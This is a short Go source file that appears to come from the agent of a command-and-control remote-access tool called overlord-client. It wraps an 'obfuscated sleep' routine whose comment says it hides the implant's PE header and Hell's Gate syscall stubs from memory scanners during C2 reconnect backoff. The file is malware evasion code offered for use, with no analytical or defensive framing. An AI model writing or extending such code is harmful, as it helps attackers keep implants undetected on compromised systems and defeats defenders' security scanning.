//go:build windows
// +build windows

package main

import (
	"time"

	"overlord-client/cmd/agent/evasion"
)

// obfSleepDuration sleeps for d with PAGE_NOACCESS protection on the PE
// header and private RWX stubs so memory scanners see no signatures at rest.
// Only safe to call when no other goroutine is executing Hell's Gate stubs
// (i.e. during the reconnect backoff when the C2 connection is down).
func obfSleepDuration(d time.Duration) {
	evasion.SleepObfuscated(d)
}
